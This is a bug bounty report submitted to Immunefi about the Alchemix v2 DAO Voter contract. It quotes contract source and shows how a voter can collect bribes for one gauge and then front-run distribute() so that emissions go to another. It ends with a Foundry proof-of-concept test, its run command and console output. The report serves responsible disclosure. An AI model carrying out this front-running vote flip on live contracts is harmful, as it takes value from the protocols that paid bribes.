# 31470 - \[SC - Critical] Bribing protocols pay bribes but dont get emiss...

Submitted on May 20th 2024 at 02:10:23 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31470

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Bug Description

Voters can vote for a particular pools in gauges only when new epoch start. Bribes are awarded based on the voting power at `EPOCH_END - 1`

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L228-L249>

```solidity
function vote(
    uint256 _tokenId,
    address[] calldata _poolVote,
    uint256[] calldata _weights,
    uint256 _boost
) external onlyNewEpoch(_tokenId) {
    require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
    require(_poolVote.length == _weights.length, "pool vote and weights mismatch");
    require(_poolVote.length > 0, "no pools voted for");
    require(_poolVote.length <= pools.length, "invalid pools");
    require(
        IVotingEscrow(veALCX).claimableFlux(_tokenId) + IFluxToken(FLUX).getUnclaimedFlux(_tokenId) >= _boost,
        "insufficient FLUX to boost"
    );
    require(
        (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost) <= maxVotingPower(_tokenId),
        "cannot exceed max boost"
    );
    require(block.timestamp < IVotingEscrow(veALCX).lockEnd(_tokenId), "cannot vote with expired token");

    _vote(_tokenId, _poolVote, _weights, _boost);
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L105-L109>

```
modifier onlyNewEpoch(uint256 _tokenId) {
    // Ensure new epoch since last vote
    require((block.timestamp / DURATION) * DURATION > lastVoted[_tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH"); // <==
    _;
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455>

```
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
    _reset(_tokenId);

    uint256 _poolCnt = _poolVote.length;
    uint256 _totalVoteWeight = 0;
    uint256 _totalWeight = 0;

    for (uint256 i = 0; i < _poolCnt; i++) {
        _totalVoteWeight += _weights[i];
    }

    IFluxToken(FLUX).accrueFlux(_tokenId);
    uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);

    for (uint256 i = 0; i < _poolCnt; i++) {
        address _pool = _poolVote[i];
        address _gauge = gauges[_pool];

        require(isAlive[_gauge], "cannot vote for dead gauge");

        uint256 _poolWeight = (_weights[i] * totalPower) / _totalVoteWeight; // <==
        require(votes[_tokenId][_pool] == 0, "already voted for pool");
        require(_poolWeight != 0, "cannot vote with zero weight");
        _updateFor(_gauge);

        poolVote[_tokenId].push(_pool);

        weights[_pool] += _poolWeight;
        votes[_tokenId][_pool] += _poolWeight;
        IBribe(bribes[_gauge]).deposit(uint256(_poolWeight), _tokenId); // <==
        _totalWeight += _poolWeight;
        emit Voted(msg.sender, _pool, _tokenId, _poolWeight);
    }

    if (_totalWeight > 0) IVotingEscrow(veALCX).voting(_tokenId);
    totalWeight += uint256(_totalWeight);
    usedWeights[_tokenId] = uint256(_totalWeight);
    lastVoted[_tokenId] = block.timestamp;

    // Update flux balance of token if boost was used
    if (_boost > 0) {
        IFluxToken(FLUX).updateFlux(_tokenId, _boost);
    }
}
```

Actual distribution of emissions to gauges happens after `EPOCH_END + X`. There is a delay between the end of the epoch and when the rewards are distributed to the gauges. Although there could be a keeper bot which will be sending `distribute()` tx right at the start of next epoch, but this tx can always be frontrun by voters to take advantage from.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L341-L350>

```solidity
function distribute() external {
    uint256 start = 0;
    uint256 finish = pools.length;

    for (uint256 x = start; x < finish; x++) {
        // We don't revert if gauge is not alive since pools.length is not reduced
        if (isAlive[gauges[pools[x]]]) {
            _distribute(gauges[pools[x]]);
        }
    }

    IMinter(minter).updatePeriod();
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L359-L380>

```solidity
function _distribute(address _gauge) internal {
    // Distribute once after epoch has ended
    require(
        block.timestamp >= IMinter(minter).activePeriod() + IMinter(minter).DURATION(),
        "can only distribute after period end"
    );

    uint256 _claimable = claimable[_gauge];

    // Reset claimable amount
    claimable[_gauge] = 0;

    _updateFor(_gauge);

    if (_claimable > 0) {
        IBaseGauge(_gauge).notifyRewardAmount(_claimable);
    }

    IBribe(bribes[_gauge]).resetVoting();

    emit DistributeReward(msg.sender, _gauge, _claimable);
}
```

As we can see in `distribute()`, rewards (stored in `claimable[gauge]`) from previous epoch are sent to the gauge and its then cleared. Later `_updateFor(gauge)` is called to update the `claimable[gauge]` mapping with any accrued reward (reward emission) from previous epoch. This updated rewards in `claimable` can only be claimed in the next epoch.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Minter.sol#L134-L187>

```solidity
function updatePeriod() external returns (uint256) {
    require(msg.sender == address(voter), "not voter");

    uint256 period = activePeriod;

    if (block.timestamp >= period + DURATION && initializer == address(0)) {
        // Only trigger if new epoch
        period = (block.timestamp / DURATION) * DURATION;
        activePeriod = period;
        epochEmissions = epochEmission();

        uint256 veAlcxEmissions = calculateEmissions(epochEmissions, veAlcxEmissionsRate);
        uint256 timeEmissions = calculateEmissions(epochEmissions, timeEmissionsRate);
        uint256 treasuryEmissions = calculateEmissions(epochEmissions, treasuryEmissionsRate);
        uint256 gaugeEmissions = epochEmissions.sub(veAlcxEmissions).sub(timeEmissions).sub(treasuryEmissions);
        uint256 balanceOf = alcx.balanceOf(address(this));

        if (balanceOf < epochEmissions) alcx.mint(address(this), epochEmissions - balanceOf);

        // Set rewards for next epoch
        rewards -= stepdown;

        // Adjust updated emissions total
        supply += rewards;

        // Once we reach the emissions tail stepdown is 0
        if (rewards <= TAIL_EMISSIONS_RATE) {
            stepdown = 0;
        }

        // If there are no votes, send emissions to veALCX holders
        if (voter.totalWeight() > 0) {
            alcx.approve(address(voter), gaugeEmissions);
            voter.notifyRewardAmount(gaugeEmissions); // <==
        } else {
            veAlcxEmissions += gaugeEmissions;
        }

        // Logic to distrubte minted tokens
        IERC20(address(alcx)).safeTransfer(address(rewardsDistributor), veAlcxEmissions);
        rewardsDistributor.checkpointToken(); // Checkpoint token balance that was just minted in rewards distributor
        rewardsDistributor.checkpointTotalSupply(); // Checkpoint supply

        IERC20(address(alcx)).safeTransfer(address(timeGauge), timeEmissions);
        timeGauge.notifyRewardAmount(timeEmissions);

        IERC20(address(alcx)).safeTransfer(treasury, treasuryEmissions);

        revenueHandler.checkpoint();

        emit Mint(msg.sender, epochEmissions, supply);
    }
    return period;
}
```

Once the reward distribution over, distribution of emission to gauge will be executed using `Minter.updatePeriod()`. Those emitted rewards are sent to `Voter` contract.

Things to note here is that

* Bribes will be awarded based on voting power at `EPOCH_END - 1`, but `Voter.distribute()` can be called at a time after `EPOCH_END`.
* Some voters may switch their votes before their votes influences emission, causing voter to receive bribes, but bribing protocol to not have received their gauge emissions.

### Attack Scenario:

Lets say some Protocol `X` wants to bribe for an epoch, expecting reward emission for their Gauge A.

* **Epoch 1:** Voter votes for Gauge A and earns bribes.
* **End of Epoch 1 (EPOCH\_END - 1):** Voter's vote is still for Gauge A, bribes calculated.
* **After EPOCH\_END + X:** Voter switches vote to Gauge B and then allowing distribution of rewards to gauges. This is possible by frontrunning distribute transaction.
* **Result:** Voter receives bribes intended for Gauge A of an epoch, but emissions are now directed to Gauge B instead of Gauge A, causing an imbalance. This means that Gauge A does not receive the emissions it was supposed to get based on the bribes it paid for, while the voter still collects the bribes.

## Impact

The voter can effectively "double dip" by getting bribes from Gauge A and then directing the actual emissions (rewards) to Gauge B, potentially exploiting the system to maximize their gains. Bribing protocols expect their bribes to translate into emissions for their gauges. This manipulation disrupts that expectation. Due to this, there is a risk of losing such partners.

## Recommendation

It should have some small window of say 1 hours at the start of each epoch to prevent any vote switching and allowing keeper bot to distribute rewards before any vote flipping could happened.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L228-L249>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L105-L109>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L341-L350>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L359-L380>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Minter.sol#L134-L187>

## Proof Of Concept

To show difference between two scenarios mentioned below, we have written two test cases, namely: `testStealingEmittedRewardsBugDistributeBeforeVote()` and `testStealingEmittedRewardsBugVoteBeforeDistribute()`.

* `vote` before `distribute` (Incorrect Order)
* `distribute` before `vote` (Correct Order)

**Steps to Run using Foundry:**

* Paste following foundry code in `src/test/Voting.t.sol`
* Both mentioned test cases cab be run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingTest --match-test testStealingEmittedRewardsBug -vv`

```solidity
function testStealingEmittedRewardsBugDistributeBeforeVote() public {
    uint256 period = minter.activePeriod();

    // Create a veALCX token and vote to trigger voter rewards
    uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    address sushiBribeAddress = voter.bribes(address(sushiGauge));
    createThirdPartyBribe(sushiBribeAddress, bal, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(sushiBribeAddress);
    address[][] memory tokens = new address[][](2);
    tokens[0] = new address[](1);
    tokens[0][0] = bal;

    address[] memory gauges = new address[](2);
    gauges[0] = address(sushiGauge);
    gauges[1] = address(balancerGauge);

    console.log("\nBefore 1st vote:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    // Vote to trigger voter rewards for sushiGauge
    hevm.prank(admin);
    voter.vote(tokenId, pools, weights, 0);

    console.log("\nAfter 1st vote:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    // Move forward a epoch relative to period to distribute
    hevm.warp(period + nextEpoch);
    voter.distribute();
    voter.updateFor(gauges);

    console.log("\nAfter 1st distribute and updateFor (+EPOCH):");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    // skip epoch to initiate attack
    period = minter.activePeriod();
    hevm.warp(period + nextEpoch);

    voter.distribute();
    voter.updateFor(gauges);

    console.log("\nAfter 2nd distribute and updateFor (+EPOCH):");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));

    // Before distribute, flip vote
    pools[0] = balancerPoolAddress;
    hevm.prank(admin);
    voter.vote(tokenId, pools, weights, 0);

    // distribute executed after vote flip
    console.log("\nAfter 2nd vote flip:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));

    assertTrue(voter.claimable(address(sushiGauge)) > 0);
    assertTrue(voter.claimable(address(balancerGauge)) == 0);
}

function testStealingEmittedRewardsBugVoteBeforeDistribute() public {
    uint256 period = minter.activePeriod();

    // Create a veALCX token and vote to trigger voter rewards
    uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    address sushiBribeAddress = voter.bribes(address(sushiGauge));
    createThirdPartyBribe(sushiBribeAddress, bal, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(sushiBribeAddress);
    address[][] memory tokens = new address[][](2);
    tokens[0] = new address[](1);
    tokens[0][0] = bal;

    address[] memory gauges = new address[](2);
    gauges[0] = address(sushiGauge);
    gauges[1] = address(balancerGauge);

    console.log("\nBefore 1st vote:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));

    // Vote to trigger voter rewards for sushiGauge
    hevm.prank(admin);
    voter.vote(tokenId, pools, weights, 0);

    console.log("\nAfter 1st vote:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    // Move forward a epoch relative to period to distribute
    hevm.warp(period + nextEpoch);
    voter.distribute();
    voter.updateFor(gauges);

    console.log("\nAfter 1st distribute and updateFor (+EPOCH):");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    // skip epoch to initiate attack
    period = minter.activePeriod();
    hevm.warp(period + nextEpoch);

    // Before distribute, flip vote
    pools[0] = balancerPoolAddress;
    hevm.prank(admin);
    voter.vote(tokenId, pools, weights, 0);

    // distribute executed after vote flip
    console.log("\nAfter 2nd vote flip (+EPOCH):");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    voter.distribute();
    voter.updateFor(gauges);

    console.log("\nAfter 2nd distribute and updateFor:");
    console.log("claimable[sushiGauge]:", voter.claimable(address(sushiGauge)));
    console.log("claimable[balancerGauge]:", voter.claimable(address(balancerGauge)));
    
    assertFalse(voter.claimable(address(sushiGauge)) > 0);
    assertFalse(voter.claimable(address(balancerGauge)) == 0);
}
```

**Console Output:**

```shell
> FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingTest --match-test testStealingEmittedRewardsBug -vv

Ran 2 tests for src/test/Voting.t.sol:VotingTest
[PASS] testStealingEmittedRewardsBugDistributeBeforeVote() (gas: 4564380)
Logs:

Before 1st vote:
  claimable[sushiGauge]: 0
  claimable[balancerGauge]: 0

After 1st vote:
  claimable[sushiGauge]: 0
  claimable[balancerGauge]: 0

After 1st distribute and updateFor (+EPOCH):
  claimable[sushiGauge]: 5037599999999999999999
  claimable[balancerGauge]: 0

After 2nd distribute and updateFor (+EPOCH):
  claimable[sushiGauge]: 4985599999999999999999
  claimable[balancerGauge]: 0

After 2nd vote flip:
  claimable[sushiGauge]: 4985599999999999999999
  claimable[balancerGauge]: 0

[PASS] testStealingEmittedRewardsBugVoteBeforeDistribute() (gas: 4544545)
Logs:

Before 1st vote:
  claimable[sushiGauge]: 0
  claimable[balancerGauge]: 0

After 1st vote:
  claimable[sushiGauge]: 0
  claimable[balancerGauge]: 0

After 1st distribute and updateFor (+EPOCH):
  claimable[sushiGauge]: 5037599999999999999999
  claimable[balancerGauge]: 0

After 2nd vote flip (+EPOCH):
  claimable[sushiGauge]: 5037599999999999999999
  claimable[balancerGauge]: 0

After 2nd distribute and updateFor:
  claimable[sushiGauge]: 0
  claimable[balancerGauge]: 4985599999999999999999
```
